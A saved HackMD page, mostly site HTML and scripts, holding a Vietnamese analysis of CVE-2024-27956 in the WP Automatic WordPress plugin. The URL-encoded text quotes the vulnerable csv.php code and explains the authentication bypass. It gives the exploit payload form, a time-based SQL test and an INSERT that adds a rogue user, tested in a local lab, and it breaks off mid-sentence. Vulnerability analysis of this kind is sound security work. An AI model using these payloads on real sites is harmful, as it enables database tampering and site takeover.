<!DOCTYPE html>
<!-- saved from url=(0037)https://hackmd.io/@cheese00/r1hYa0hZA -->
<html lang="vi-VN" data-themeable="true" theme="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="ejFWFIep-unkOjvkGHVbuTENyYTGR1uA7wG0">
    
    
    <meta name="description" content="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main">
    
    <title>Phân tích CVE-2024-27956 - HackMD</title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
	<link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
	<!--  meta value for server side given sign in boolean -->
    <meta name="signin" content="false">

    
<script type="text/javascript" async="" defer="" src="./Phân tích CVE-2024-27956 - HackMD_files/ppms.js.tải xuống"></script><script async="" src="./Phân tích CVE-2024-27956 - HackMD_files/8b665e66-46fc-4c65-aef4-4c3429ff4551.js.tải xuống"></script><script async="" src="./Phân tích CVE-2024-27956 - HackMD_files/gtm.js.tải xuống"></script><script nonce="">
  window.domain = 'hackmd.io'
  window.urlpath = ''
  window.debug = false || window.localStorage.getItem('HMD_DEBUG_FLAG') === 'true'
  window.version = '1.3.0'
  window.brand = 'HackMD'

  
  window.NOTE_ID = 'mdCZ47GqRHyqROXJ9n-QsA'
  

  window.GOOGLE_DRIVE_API_KEY = 'AIzaSyAHmcP5gL_64ZafuAYOvJruFAIaYgHQaY4'
  window.GOOGLE_DRIVE_CLIENT_ID = '65857506266-76uhhee8se8dgs1i0q8fhtj1prg0ar27.apps.googleusercontent.com'
  window.DROPBOX_APP_KEY = 'rdoizrlnkuha23r'
  
  window.PLANTUML_SERVER = 'https://ptuml.hackmd.io'

  window.ASSET_URL = 'https://assets.hackmd.io'

  window.USER_CAN_CREATE_TEAM = true
  window.USER_CAN_DELETE_ACCOUNT = true
  window.USER_DELETE_ACCOUNT_VIA_EMAIL = true
  window.PAYMENT_ENABLED = true
  window.PAYMENT_PROMOTION_BANNER_ENABLED = false
  window.GITHUB_SYNC_ENABLED = true
  window.GITLAB_SYNC_ENABLED = false
  window.GITLAB_SYNC_BASE_URL = ''
  window.VCS_SYNC_MODE = 'github'
  window.VCS_PROVIDER_NAME = 'GitHub'
  window.FREE_TEAM_NUM = 20
  window.FREE_TEAM_MEMBER_NUM = 3
  window.FREE_PUBLIC_TEAM_NUM = 10
  window.NEO_OVERVIEW_UI = true

  
      window.FOLDER_ENABLE = true
  

  
  window.EE_SITE_ENABLE = false
  window.EE_SITE_NAME = 'false'
  window.EE_SITE_LINK = 'false'
  window.EESITE_INFO = false
  window.ENTERPRISE_DISCOVERY_ENABLE = false
  window.ENTERPRISE_DISCOVERY_TEAM = true
  window.ENTERPRISE_DISCOVERY_NOTE = true
  window.ENTERPRISE_DISCOVERY_VIEW_PERMISSION = 'guest'
  
  window.ALLOW_ANONYMOUS = true
  window.ALLOW_ANONYMOUS_EDIT = false
  window.ALLOW_DOWNLOAD_PDF = true
  window.PUBLIC_OVERVIEW = false
  window.INTERNAL_PUBLIC_OVERVIEW = false
  window.FULL_TEXT_SEARCH_ENABLE = false
  window.ALGOLIA_SEARCH_ENABLE = true
  window.MARKETING_EMAIL_ENABLE = true
  window.OFFLINE_ACCESS = true
  
  
  
    window.WALLET_CONNECT_PROJECT_ID = '91d6fa182b725b5895a17a170a5878c1'
  
  window.API_MANAGEMENT_UI_ENABLE = true
  window.FEEDBACK_UI_ENABLE = true
  window.PUBLISH_ENABLE = true

  

  
  window.SHOW_HOT_NOTES = false
  

  
  window.HOT_NOTES_TIME_TYPE = 'week'
  

  
  window.SHOW_OVERVIEW = false
  

  
  window.MENTIONS = {}
  

  
  window.MENTION_ANCHORS = []
  

  
  window.COMMENT_ANCHORS = []
  

  
  window.IS_OWNER = false
  

  
  window.IS_TEAM_ADMIN = false
  

  
  window.IS_TEAM_MEMBER = false
  

  
  window.IS_INVITEE_ADMIN = false
  

  
  window.USER_PROFILE = '%7B%22name%22%3A%22Guest%20Reeves%22%7D'
  

  
  window.VERSION_TIME = '1715064644113'
  

  
  window.canEdit = false
  

  
  window.canWriteComment = false
  

  
  window.canHideComment = false
  

  window.TRASH_NOTE_DELETE_AFTER_FREE = 3
  window.TRASH_NOTE_DELETE_AFTER_PAID = 30

  
    window.ENABLED_PREVIEW_FEATURE = {}
  

  
    window.ACTIVE_PREVIEW_FEATURE = ["beta-slide-preview"]
  

  
    window.IS_OWNER_UPGRADED = false
  

  
    window.IMGUR_FALLBACK_CDN = 'https://imgur-backup.hackmd.io'
  

  
    window.CLOUD_META_UI = true
  
  
    window.CLOUD_META_API = true
  
  
    window.CLOUD_META_MIGRATION = false
  
  
    window.YAML_METADATA_ENABLED = false
  

  
    window.NOTE_CAPACITY_LIMIT = 50
  

  
    window.DOCUMENT_MAX_LENGTH = 100000
  

  
    window.SOCIAL_NETWORK_FEATURES_ENABLED = true
  

  
    window.PUBLISHMENT_MODERATION_ENABLED = true
  

  
    window.COMMENT_ENABLED = true
  

  
    window.COMMENT_PERMISSION = "signed_in_users"
  

  window.SUGGEST_EDIT_ENABLED = true
  
    window.SUGGEST_EDIT_ENABLED = true
  

  window.CITATION_ENABLED = false

  window.NOTE_FROM_COMMENT_ENABLED = false

  
    window.NOTE_FEATURES = {"emoji-reply":"signed_in_users","citation":"disabled"}
  

  
    window.REALTIME_CLIENT_WITH_CREDENTIALS = false
  

  
    window.DEBUG_DISCONNECT_SOCKET_WHEN_OFFLINE = false
  

  

  

  

  
    window.CUSTOM_STYLE_ENABLED = "true"
  

  
    window.USE_NEW_LOGO = true
  

  
    window.ITERABLE_ENABLED = true
  
  
    window.ITERABLE_API_KEY = "c2c36a44c2614fb19aa3b46d660bbce2"
  

  
    window.TEXT_SELECTION_CHANGED = false
  

  
    window.CAN_VIEW_HISTORY_AT_REVISION = false
  

  
    window.GUIDED_COMMENT_ENABLED = true
  
</script>


    
<!-- Google Tag Manager -->
<script nonce="">(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-KLW9Z3');</script>
<!-- End Google Tag Manager -->


    






    <meta property="fb:app_id" content="1436904003272070">



    <meta name="robots" content="index, follow">



    <meta name="twitter:image:src" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta name="twitter:image:alt" content="Phân tích CVE-2024-27956 - HackMD">


<meta name="twitter:site" content="@hackmdio">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Phân tích CVE-2024-27956 - HackMD">


    <meta name="twitter:description" content="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main">



    <meta property="og:image" content="https://hackmd.io/images/media/HackMD-neo-og.jpg">
    <meta property="og:image:alt" content="Phân tích CVE-2024-27956 - HackMD">


<meta property="og:site_name" content="HackMD">
<meta property="og:type" content="article">
<meta property="og:title" content="Phân tích CVE-2024-27956 - HackMD">


    <meta property="og:description" content="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main">



    <link rel="canonical" href="https://hackmd.io/@cheese00/r1hYa0hZA">
    <meta property="og:url" content="https://hackmd.io/@cheese00/r1hYa0hZA">
    <meta property="twitter:url" content="https://hackmd.io/@cheese00/r1hYa0hZA">

    <link rel="alternate" type="text/markdown" href="https://hackmd.io/@cheese00/r1hYa0hZA.md" title="Pure markdown version">
    <link rel="alternate" type="text/markdown" href="https://hackmd.io/@cheese00/r1hYa0hZA.md?no-meta" title="Pure markdown version without metadata">


     <link href="./Phân tích CVE-2024-27956 - HackMD_files/font-vendor.ea8218d7d4f468b2c430.css" rel="stylesheet"><link href="./Phân tích CVE-2024-27956 - HackMD_files/common-vendor.fd34b1d1ad1390fa8864.css" rel="stylesheet"><link href="./Phân tích CVE-2024-27956 - HackMD_files/pretty-vendor.d39c3586ad724c4bdff1.css" rel="stylesheet"><link href="./Phân tích CVE-2024-27956 - HackMD_files/pretty.191080504f40238cb56f.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
<![endif]-->

    


    <script nonce="">
  window.__shouldIgnoreTracker = function() {
    const isDebug = window.debug === true
    const isLocal = /^localhost$|^127(\.[0-9]+){0,2}\.[0-9]+$|^\[::1?\]$|^local\.localhost$/.test(location.hostname) || location.protocol === 'file:'
    const isAutomation = Boolean(window._phantom || window.__nightmare || window.navigator.webdriver || window.Cypress)
    return isDebug || isLocal || isAutomation
  }
</script>

<!-- plausible -->
<script defer="" data-domain="hackmd.io" src="./Phân tích CVE-2024-27956 - HackMD_files/script.js.tải xuống"></script>
<script nonce="">
  window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments); }
  const keyboardWhiteList = ['a', 'span', 'button']

  function getTaggedEventAttributes (e) {
    const eventAttrs = { name: null, props: {} }
    if (!e || !e.classList) return eventAttrs
    const psEvent = /plausible-event-(.+)(=|--)(.+)/
    for (const className of [...e.classList]) {
      const [, key, , val] = className.match(psEvent) || []
      if (!key || !val) continue
      const value = val.replace(/\+/g, ' ')
      switch (key.toLowerCase()) {
        case 'name':
          eventAttrs.name = value
          break
        default:
          eventAttrs.props[key] = value
          break
      }
    }
    return eventAttrs
  }

  function shouldIgnore () {
    return window.__shouldIgnoreTracker() || window.localStorage.getItem('plausible_ignore') === 'true'
  }

  function handler (e) {
    if (!window.plausible) return
    if (!e.target || !('className' in e.target)) return
    const ele = e.target

    const eventAttrs = getTaggedEventAttributes(ele)
    if (!eventAttrs.name) return
    if (ele?.href) eventAttrs.props.url = ele.href

    if (shouldIgnore()) {
      if (window.debug) logDebugEventMsg(eventAttrs)
      return
    }
    window.plausible(eventAttrs.name, { props: eventAttrs.props })
  }

  function logDebugEventMsg (eventAttrs) {
    console.warn(
      `Ignoring Event: "${eventAttrs.name}"`,
      eventAttrs,
    )
  }

  function keydownHandler (e) {
    if (e.key !== 'Enter') return
    if (e.target.nodeName.toLowerCase() === 'input') {
      switch (e.target.type.toLowerCase()) {
        case 'submit':
        case 'button':
        case 'reset':
        case 'checkbox':
        case 'radio':
        case 'file':
        case 'image':
        case 'color':
          break
        default:
          return
      }
    } else if (!keyboardWhiteList.includes(e.target.nodeName.toLowerCase())) {
      return
    }
    handler(e)
  }

  document.addEventListener('mousedown', handler)
  document.addEventListener('keydown', keydownHandler)
</script>

<!-- piwik pro -->
<script type="text/javascript" nonce="">
  (function(window, document, dataLayerName, id) {
    if (window.__shouldIgnoreTracker()) {
      if (window.debug) {
        console.warn('Ignoring Piwik Pro Tracker due to debug mode or local environment.')
      }
      return;
    }

    window[dataLayerName]=window[dataLayerName]||[];
    window[dataLayerName].push({start:(new Date).getTime(),event:"stg.start"});

    var scripts=document.getElementsByTagName('script')[0];
    var tags=document.createElement('script');
    var qP=[];
    dataLayerName!=="dataLayer"&&qP.push("data_layer_name="+dataLayerName);
    var qPString=qP.length>0?("?"+qP.join("&")):"";

    tags.async=true;
    tags.src="https://hackmd.containers.piwik.pro/"+id+".js"+qPString;
    tags.nonce="b7f88ea7-a6d3-4e8e-8b76-445c6c19cec5";
    scripts.parentNode.insertBefore(tags,scripts);

    !function(a,n,i){
    a[n]=a[n]||{};
    for(var c=0;c<i.length;c++)!function(i){
        a[n][i]=a[n][i]||{},a[n][i].api=a[n][i].api||function(){
        var a=[].slice.call(arguments,0);
        "string"==typeof a[0]&&window[dataLayerName].push({
            event:n+"."+i+":"+a[0],
            parameters:[].slice.call(arguments,1)
        })
        }
    }(i[c])
    }(window,"ppms",["tm","cm"]);
  })(window, document, 'dataLayer', '8b665e66-46fc-4c65-aef4-4c3429ff4551');
</script>

    
<script nonce="">
  window.publishProps = JSON.parse(`{"isOwnerAnonymous":false,"isOwnedByTeam":false,"ownerInfo":{"name":"Chi%20Lam","path":"cheese00","avatarUrl":"https%3A%2F%2Flh3.googleusercontent.com%2Fa%2FAEdFTp75QFCKqWg1h3OfyDxwp8XpZM01izYsx18ZvSqm%3Ds96-c","description":null},"isPublished":true,"createTime":1714380163821,"updateTime":1715064644113,"vcsSyncMode":"github","vcsProviderName":"GitHub","canEdit":false,"hardBreaks":true,"onlyOwnerCanEdit":true,"isCommentEnabled":true,"likedCount":0,"isNotificationEnabled":true,"notificationType":"never","hasEmail":false,"canWriteComment":false,"viewCount":1415,"markdown":"%23%20Ph%C3%A2n%20t%C3%ADch%20CVE-2024-27956%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBkGjxeT-A.png)%0A%0A%23%23%20T%C3%B3m%20t%E1%BA%AFt%0A%0AL%E1%BB%97%20h%E1%BB%95ng%20n%C3%A0y%20t%E1%BB%93n%20t%E1%BA%A1i%20trong%20plugin%20WP%20Automatic%20(premium%20version)%20%C4%91%C6%B0%E1%BB%A3c%20ph%C3%A1t%20tri%E1%BB%83n%20b%E1%BB%9Fi%20ValvePress.%20L%E1%BB%97%20h%E1%BB%95ng%20n%C3%A0y%20cho%20ph%C3%A9p%20b%E1%BA%A5t%20k%E1%BB%B3%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20ch%C6%B0a%20%C4%91%C6%B0%E1%BB%A3c%20x%C3%A1c%20th%E1%BB%B1c%20n%C3%A0o%20c%C3%B3%20th%E1%BB%83%20ki%E1%BB%83m%20so%C3%A1t%20ho%C3%A0n%20to%C3%A0n%20truy%20v%E1%BA%A5n%20SQL%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20th%E1%BB%B1c%20thi%20tr%C3%AAn%20trang%20web%20WordPress.%20T%E1%BB%AB%20%C4%91%C3%B3%2C%20k%E1%BA%BB%20t%E1%BA%A5n%20c%C3%B4ng%20c%C3%B3%20th%E1%BB%83%3A%0A-%20T%E1%BA%A1o%20t%C3%A0i%20kho%E1%BA%A3n%20qu%E1%BA%A3n%20tr%E1%BB%8B%20vi%C3%AAn%0A-%20T%E1%BA%A3i%20l%C3%AAn%20Web%20Shell%20v%C3%A0%20Backdoor%0A-%20Ho%C3%A0n%20to%C3%A0n%20ki%E1%BB%83m%20so%C3%A1t%20%C4%91%C6%B0%E1%BB%A3c%20m%C3%A1y%20ch%E1%BB%A7%20web%0A%0A%23%23%20Set%20up%20m%C3%B4i%20tr%C6%B0%E1%BB%9Dng%20%C4%91%E1%BB%83%20ph%C3%A2n%20t%C3%ADch%0A%0AC%C3%A1c%20c%C3%B4ng%20c%E1%BB%A5%20thi%E1%BA%BFt%20b%E1%BB%8B%20m%C3%ACnh%20s%E1%BB%AD%20d%E1%BB%A5ng%20%C4%91%E1%BB%83%20ph%C3%A2n%20t%C3%ADch%3A%0A%0A-%20MacOS%0A-%20%5BWordpress%20version%206.5.2%5D(https%3A%2F%2Fwordpress.org%2Fdownload%2F)%0A-%20%5BXAMPP%208.2.4%5D(https%3A%2F%2Fwww.apachefriends.org%2F)%0A-%20%5BPlugin%20WP%20Automatic%20version%203.92.0%5D(https%3A%2F%2Fgithub.com%2Ftruonghuuphuc%2FCVE-2024-27956%2Ftree%2Fmain)%2C%20plugin%20n%C3%A0y%20m%C3%ACnh%20d%C3%B9ng%20k%C3%A9%20c%E1%BB%A7a%20m%E1%BB%99t%20b%C3%A0i%20ph%C3%A2n%20t%C3%ADch%20tr%C3%AAn%20github%20%0A%20%0A%23%23%20Sink%0A%0AFile%20code%20b%E1%BB%8B%20d%C3%ADnh%20l%E1%BB%97i%3A%20%60inc%2Fcsv.php%60%0A%0ATrong%20%C4%91%C3%B3%20%C4%91o%E1%BA%A1n%20code%20%C4%91%C3%A1ng%20ch%C3%BA%20%C3%BD%3A%0A%0A%60%60%60php%3D%0A%2F%2F%20extract%20query%0A%24q%20%3D%20stripslashes(%24_POST%5B'q'%5D)%3B%0A%24auth%20%3D%20stripslashes(%24_POST%5B'auth'%5D)%3B%0A%24integ%3Dstripslashes(%24_POST%5B'integ'%5D)%3B%0A%0Aif(wp_automatic_trim(%24auth%20%3D%3D%20''))%7B%0A%09%20%20echo%20'login%20required'%3B%0A%09exit%3B%0A%7D%0A%0Aif(wp_automatic_trim(%24auth)%20!%3D%20wp_automatic_trim(%24current_user-%3Euser_pass))%7B%0A%09%20%20echo%20'invalid%20login'%3B%0A%09exit%3B%0A%7D%0A%0Aif(md5(wp_automatic_trim(%24q.%24current_user-%3Euser_pass))%20!%3D%20%24integ%20)%7B%0A%09%20%20echo%20'Tampered%20query'%3B%0A%09exit%3B%0A%7D%0A%20%0A%0A%24rows%3D%24wpdb-%3Eget_results(%24q)%3B%0A%60%60%60%0A%0A%0ATa%20c%C3%B3%20th%E1%BB%83%20th%E1%BA%A5y%20%60%24rows%3D%24wpdb-%3Eget_results(%24q)%3B%60%20s%E1%BA%BD%20th%E1%BB%B1c%20thi%20c%C3%A2u%20query%20%E1%BB%9F%20variable%20%60%24q%60%0A%0AM%C3%A0%20variable%20%60%24q%60%20ch%C3%ADnh%20l%C3%A0%20tham%20s%E1%BB%91%20%60q%60%20%C4%91%C6%B0%E1%BB%A3c%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20POST%20l%C3%AAn%20server%0A%0A%3D%3E%20**Ta%20c%C3%B3%20th%E1%BB%83%20g%E1%BB%ADi%20b%E1%BA%A5t%20k%E1%BB%B3%20truy%20v%E1%BA%A5n%20SQL%20cho%20server%20th%C3%B4ng%20qua%20tham%20s%E1%BB%91%20%60q%60**%0A%0A%23%23%20Ph%C3%A2n%20t%C3%ADch%0A%0ATuy%20nhi%C3%AAn%20server%20c%C3%B3%20th%E1%BB%B1c%20hi%E1%BB%87n%20m%E1%BB%99t%20s%E1%BB%91%20ki%E1%BB%83m%20tra%20x%C3%A1c%20th%E1%BB%B1c%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20tr%C6%B0%E1%BB%9Bc%20khi%20th%E1%BB%B1c%20thi%20truy%20v%E1%BA%A5n.%20C%C3%A1c%20b%C6%B0%E1%BB%9Bc%20ki%E1%BB%83m%20tra%20s%E1%BA%BD%20%C4%91%E1%BB%81u%20qua%20h%C3%A0m%20%60wp_automatic_trim%60%0A%0A%60%60%60php%3D%0Afunction%20wp_automatic_trim(%24str)%0A%7B%0A%09if%20(is_null(%24str))%20%7B%0A%09%09return%20''%3B%0A%09%7D%20else%20%7B%0A%09%09return%20trim(%24str)%3B%0A%09%7D%0A%7D%0A%60%60%60%0ATrong%20%C4%91%C3%B3%20%60trim()%60%20s%E1%BA%BD%20gi%C3%BAp%20xo%C3%A1%20c%C3%A1c%20k%C3%BD%20t%E1%BB%B1%20tr%E1%BA%AFng%20d%C6%B0%20th%E1%BB%ABa%20nh%C6%B0%3A%0A-%20K%C3%BD%20t%E1%BB%B1%20tr%E1%BA%AFng%20%C4%91%E1%BA%A7u%20chu%E1%BB%97i%0A-%20K%C3%BD%20t%E1%BB%B1%20tr%E1%BA%AFng%20cu%E1%BB%91i%20chu%E1%BB%97i%0A-%20Nhi%E1%BB%81u%20k%C3%BD%20t%E1%BB%B1%20tr%E1%BA%AFng%20g%E1%BA%A7n%20nhau%20%C4%91%C6%B0%E1%BB%A3c%20l%C6%B0%E1%BB%A3c%20b%E1%BB%8F%20c%C3%B2n%201%20k%C3%BD%20t%E1%BB%B1%20tr%E1%BA%AFng%0A%0ASau%20khi%20%C4%91%C6%B0%E1%BB%A3c%20trim%2C%20c%C3%A1c%20variable%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20ki%E1%BB%83m%20tra%0A%0A**%60%24auth%60%20check**%0A%0A%60%60%60php!%0Awp_automatic_trim(%24auth)%20!%3D%20wp_automatic_trim(%24current_user-%3Euser_pass)%0A%60%60%60%0A%0ANh%C6%B0ng%20v%C3%AC%20t%E1%BA%ADp%20tin%20%C4%91%C6%B0%E1%BB%A3c%20truy%20c%E1%BA%ADp%20b%E1%BB%9Fi%20m%E1%BB%99t%20ng%C6%B0%E1%BB%9Di%20d%C3%B9ng%20ch%C6%B0a%20%C4%91%C6%B0%E1%BB%A3c%20x%C3%A1c%20th%E1%BB%B1c%20(unauthenticated%20user)%20n%C3%AAn%20%60wp_automatic_trim(%24current_user-%3Euser_pass)%60%20s%E1%BA%BD%20b%E1%BA%B1ng%20%60''%60.%20%0A%0ANh%C6%B0%20v%E1%BA%ADy%20ta%20ch%E1%BB%89%20c%E1%BA%A7n%20%C4%91%E1%BB%83%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20%60%24auth%60%20l%C3%A0%20m%E1%BB%99t%20chu%E1%BB%97i%20r%E1%BB%97ng%0A%0A**%60%24insteg%60%20check**%0A%60%60%60php!%0Amd5(wp_automatic_trim(%24q.%24current_user-%3Euser_pass))%20!%3D%20%24integ%0A%60%60%60%0A%0A%60%24current_user-%3Euser_pass%60%20l%C3%A0%20chu%E1%BB%97i%20r%E1%BB%97ng%20n%C3%AAn%20%C4%91%C3%A2y%20s%E1%BA%BD%20l%C3%A0%20so%20s%C3%A1nh%20%60md5(%24q)%60%20v%E1%BB%9Bi%20%60%24integ%60%20%0A%0ANh%C6%B0%20v%E1%BA%ADy%20ta%20ch%E1%BB%89%20c%E1%BA%A7n%20%C4%91%E1%BB%83%20gi%C3%A1%20tr%E1%BB%8B%20c%E1%BB%A7a%20%60%24integ%60%20l%C3%A0%20md5%20c%E1%BB%A7a%20c%C3%A2u%20truy%20v%E1%BA%A5n%0A%0A**Empty%20string%20%60%24auth%60%20check**%0ATuy%20nhi%C3%AAn%20tr%C6%B0%E1%BB%9Bc%20%C4%91%C3%B3%20%60%24auth%60%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20check%20xem%20c%C3%B3%20ph%E1%BA%A3i%20l%C3%A0%20chu%E1%BB%97i%20r%E1%BB%97ng%20hay%20kh%C3%B4ng.%20%C4%90%E1%BB%83%20bypass%20%C4%91%C6%B0%E1%BB%A3c%20ta%20ch%E1%BB%89%20c%E1%BA%A7n%20%C4%91%E1%BB%83%20%60%24auth%60%20l%C3%A0%20m%E1%BB%99t%20kho%E1%BA%A3ng%20tr%E1%BA%AFng%20%60%2520%60%20hay%20%60%2500%60%0A%0ASau%20%C4%91%C3%B3%20khi%20%C4%91%C6%B0%E1%BB%A3c%20check%20v%E1%BB%9Bi%20%60%24current_user-%3Euser_pass%60%20th%C3%AC%20kho%E1%BA%A3ng%20tr%E1%BA%AFng%20trong%20%60%24auth%60%20s%E1%BA%BD%20%C4%91%C6%B0%E1%BB%A3c%20l%C6%B0%E1%BB%A3c%20b%E1%BB%8F%20%C4%91i%20nh%E1%BB%9D%20h%C3%A0m%20%60trim()%60%0A%0A%23%23%20Payload%0A%0APayload%20%C4%91%E1%BB%83%20exploit%20s%E1%BA%BD%20c%C3%B3%20d%E1%BA%A1ng%3A%0A%0A%60%60%60%0Aq%3D%5Bquery%5D%26auth%3D%2520%26integ%3D%5Bmd5(query)%5D%0A%60%60%60%0A%0A%23%23%23%20Ki%E1%BB%83m%20tra%20l%E1%BB%97%20h%E1%BB%95ng%0A%0AC%C3%A2u%20truy%20v%E1%BA%A5n%20sql%20%C4%91%E1%BB%83%20ki%E1%BB%83m%20tra%20xem%20server%20c%C3%B3%20th%E1%BB%B1c%20thi%20c%C3%A2u%20truy%20v%E1%BA%A5n%20m%C3%A0%20ta%20g%E1%BB%ADi%20l%C3%AAn%0A%60%60%60sql!%0ASELECT%20IF(1%3D2%2Csleep(5)%2Csleep(0))%0A%60%60%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FHJx53IyGA.png)%0A%0A%3D%3E%20Quan%20s%C3%A1t%20th%E1%BA%A5y%20server%20tr%E1%BA%A3%20v%E1%BB%81%20response%20ngay%20l%E1%BA%ADp%20t%E1%BB%A9c%0A%0A%60%60%60sql!%0ASELECT%20IF(1%3D1%2Csleep(5)%2Csleep(0))%0A%60%60%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FH1ikT8kGR.png)%0A%0A%3D%3E%20Quan%20s%C3%A1t%20th%E1%BA%A5y%20server%20m%E1%BA%A5t%20m%E1%BB%99t%20l%C3%BAc%20(kho%E1%BA%A3ng%205%20gi%C3%A2y)%20m%E1%BB%9Bi%20tr%E1%BA%A3%20v%E1%BB%81%20response%0A%0A%23%23%23%20T%E1%BA%A1o%20m%E1%BB%99t%20user%20Wordpress%20m%E1%BB%9Bi%0A%0AKi%E1%BB%83m%20tra%20table%20%60wp_users%60%20hi%E1%BB%87n%20t%E1%BA%A1i%20ch%E1%BB%89%20c%C3%B3%201%20user%20%60admin%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrkdG1wkGR.png)%0A%0AC%C3%A2u%20truy%20v%E1%BA%A5n%20%C4%91%E1%BB%83%20t%E1%BA%A1o%20user%20m%E1%BB%9Bi%20v%C3%A0o%20table%20%60wp_users%60%3A%0A%0A%60%60%60sql!%0AINSERT%20INTO%20wp_users%20(user_login%2C%20user_pass%2C%20user_nicename%2C%20user_email%2C%20user_registered%2C%20user_status)%20VALUES%20('poc'%2C%20MD5('poc')%2C%20'poc'%2C%20'poc%40localhost.org'%2C%20NOW()%2C%200)%0A%60%60%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2Fryht1PJz0.png)%0A%0AKi%E1%BB%83m%20tra%20l%E1%BA%A1i%20database%20th%E1%BA%A5y%20%C4%91%C3%A3%20c%C3%B3%20th%C3%AAm%20user%20m%E1%BB%9Bi%20%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FrJ1LxP1zA.png)%0A%0A%23%23%23%20Ki%E1%BB%83m%20tra%20user%20v%E1%BB%ABa%20t%E1%BA%A1o%20t%E1%BB%93n%20t%E1%BA%A1i%20trong%20table%0A%0AD%E1%BB%B1a%20theo%20source%20code%3A%0A%0A%60%60%60php%3D%0A%24rows%3D%24wpdb-%3Eget_results(%20%24q)%3B%0A%24date%3Ddate(%22F%20j%2C%20Y%2C%20g%3Ai%20a%20s%22)%3B%0A%24fname%3Dmd5(%24date)%3B%0Aheader(%22Content-type%3A%20application%2Fcsv%22)%3B%0Aheader(%22Content-Disposition%3A%20attachment%3B%20filename%3D%24fname.csv%22)%3B%0Aheader(%22Pragma%3A%20no-cache%22)%3B%0Aheader(%22Expires%3A%200%22)%3B%0A%0A%20%20echo%20%22DATE%2CACTION%2CDATA%2CKEYWORD%20%5Cn%22%3B%0Aforeach(%24rows%20as%20%24row)%7B%0A%09%0A%09%24action%3D%24row-%3Eaction%3B%0A%09if%20(stristr(%24action%20%2C%20'New%20Comment%20Posted%20on%20%3A'))%7B%0A%09%09%09%24action%20%3D%20'Posted%20Comment'%3B%0A%09%09%7Delseif(stristr(%24action%20%2C%20'approved'))%7B%0A%09%09%09%24action%20%3D%20'Approved%20Comment'%3B%0A%09%7D%0A%09%0A%09%2F%2Fformat%20date%0A%09%24date%3Ddate('Y-n-j%20H%3Ai%3As'%2Cstrtotime%20(%24row-%3Edate))%3B%0A%0A%09%24data%3D%24row-%3Edata%3B%0A%09%24keyword%3D''%3B%0A%09%2F%2Ffilter%20the%20data%20strip%20keyword%0A%09if(stristr(%24data%2C'%3B'))%7B%0A%09%09%24datas%3Dexplode('%3B'%2C%24row-%3Edata)%3B%0A%09%09%24data%3D%24datas%5B0%5D%3B%0A%09%09%24keyword%3D%24datas%5B1%5D%3B%0A%09%7D%0A%09%20%20echo%20%22%24date%2C%24action%2C%24data%2C%24keyword%20%5Cn%22%3B%0A%0A%7D%0A%60%60%60%0A%0A%3D%3E%20Truy%20v%E1%BA%A5n%20tr%E1%BA%A3%20v%E1%BB%81%20row%20th%C3%AC%20s%E1%BA%BD%20hi%E1%BB%87n%20date%0A%0AC%C3%A2u%20truy%20v%E1%BA%A5n%20m%E1%BB%99t%20user%20kh%C3%B4ng%20c%C3%B3%20trong%20db%0A%60%60%60sql!%0ASELECT%20*%20FROM%20%60wp_users%60%20WHERE%20user_login%3D'abc'%0A%60%60%60%0A%0A!%5Bimage%5D(https%3A%2F%2Fhackmd.io%2F_uploads%2FBJaxNDkM0.png)%0A%0A%3D%3E%20Quan%20s%C3%A1t%20th%E1%BA%A5y%20do%20kh%C3%B4ng%20c%C3%B3%20row%20n%C3%A0o%20tho%E1%BA%A3%20%C4%91i%E1%BB%81u%20ki%E1%BB%87n%20n%C3%AAn%20kh%C3%B4ng%20hi%E1%BB%87n%20date%0A%0AThay%20%60user_login%60%20th%C3%A0nh%20user%20%60p